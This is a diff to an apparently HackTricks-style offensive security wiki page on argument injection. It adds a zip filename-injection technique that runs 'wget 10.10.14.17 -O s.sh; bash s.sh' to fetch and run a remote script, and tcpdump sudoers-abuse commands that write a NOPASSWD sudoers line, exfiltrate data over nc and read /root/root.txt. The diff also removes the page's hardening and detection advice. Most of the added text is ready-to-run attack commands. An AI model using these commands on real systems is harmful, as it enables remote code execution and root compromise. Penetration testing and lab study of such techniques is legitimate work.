@@ -95,13 +95,32 @@ If root executes something like:
 
 ## zip
 
-`zip` supports the flag `--unzip-command` that is passed *verbatim* to the system shell when the archive will be tested:
+Two very practical primitives exist when an application passes user-controlled filenames to `zip` (either via a wildcard or by enumerating names without `--`).
+
+- RCE via test hook: `-T` enables “test archive” and `-TT <cmd>` replaces the tester with an arbitrary program (long form: `--unzip-command <cmd>`). If you can inject filenames that start with `-`, split the flags across distinct filenames so short-options parsing works:
 
 ```bash
-zip result.zip files -T --unzip-command "sh -c id"
+# Attacker-controlled filenames (e.g., in an upload directory)
+# 1) A file literally named: -T
+# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
+# 3) Any benign file to include (e.g., data.pcap)
+# When the privileged code runs: zip out.zip <files...>
+# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
 ```
 
-Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.
+Notes
+- Do NOT try a single filename like `'-T -TT <cmd>'` — short options are parsed per character and it will fail. Use separate tokens as shown.
+- If slashes are stripped from filenames by the app, fetch from a bare host/IP (default path `/index.html`) and save locally with `-O`, then execute.
+- You can debug parsing with `-sc` (show processed argv) or `-h2` (more help) to understand how your tokens are consumed.
+
+Example (local behavior on zip 3.0):
+
+```bash
+zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
+zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
+```
+
+- Data exfil/leak: If the web layer echoes `zip` stdout/stderr (common with naive wrappers), injected flags like `--help` or failures from bad options will surface in the HTTP response, confirming command-line injection and aiding payload tuning.
 
 ---
 
@@ -159,28 +178,79 @@ No-removable-media variants:
 - If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /bin/sh /path/script.sh` or `-z /path/script.sh` depending on platform semantics.
 - Some vendor wrappers rotate to attacker-controllable locations. If you can influence the rotated path (symlink/directory traversal), you can steer `-z` to execute content you fully control without external media.
 
-Hardening tips for vendors:
+---
 
-- Never pass user-controlled strings directly to `tcpdump` (or any tool) without strict allowlists. Quote and validate.
-- Do not expose `-z` functionality in wrappers; run tcpdump with a fixed safe template and disallow extra flags entirely.
-- Drop tcpdump privileges (cap_net_admin/cap_net_raw only) or run under a dedicated unprivileged user with AppArmor/SELinux confinement.
+## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root
 
+Very common sudoers anti-pattern:
 
-## Detection & Hardening
+```text
+(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
+```
 
-1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
-2. **Quote or escape** arguments: `tar -czf "$dst" -- *` is *not* safe — prefer `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
-3. **Explicit paths**: Use `/var/www/html/*.log` instead of `*` so attackers cannot create sibling files that start with `-`.
-4. **Least privilege**: Run backup/maintenance jobs as an unprivileged service account instead of root whenever possible.
-5. **Monitoring**: Elastic’s pre-built rule *Potential Shell via Wildcard Injection* looks for `tar --checkpoint=*`, `rsync -e*`, or `zip --unzip-command` immediately followed by a shell child process. The EQL query can be adapted for other EDRs. 
+Issues
+- The `*` glob and permissive patterns only constrain the first `-w` argument. `tcpdump` accepts multiple `-w` options; the last one wins.  
+- The rule doesn’t pin other options, so `-Z`, `-r`, `-V`, etc. are allowed.
+
+Primitives
+- Override destination path with a second `-w` (first only satisfies sudoers):
+
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ \
+  -w /dev/shm/out.pcap \
+  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+
+- Path traversal inside the first `-w` to escape the constrained tree:
+
+```bash
+sudo tcpdump -c10 \
+  -w/var/cache/captures/a/../../../../dev/shm/out \
+  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+
+- Force output ownership with `-Z root` (creates root-owned files anywhere):
+
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
+  -w /dev/shm/root-owned \
+  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+
+- Arbitrary-content write by replaying a crafted PCAP via `-r` (e.g., to drop a sudoers line):
+
+<details>
+<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>
+
+```bash
+# On attacker box: craft a UDP packet stream that carries the target line
+printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
+sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
+cat sudoers | nc -u 127.0.0.1 9001; kill %1
+
+# On victim (sudoers rule allows tcpdump as above)
+sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
+  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
+  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
+
+</details>
+
+- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Error diagnostics often echo lines, leaking content:
+
+```bash
+sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
+  -w /tmp/dummy \
+  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
+```
 
 ---
 
 ## References
 
-* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)  
-* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)
-* GTFOBins – [tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
-* FiberGateway GR241AG – [Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
+- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
+- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
+- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
+- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
 
 {{#include ../../banners/hacktricks-training.md}}
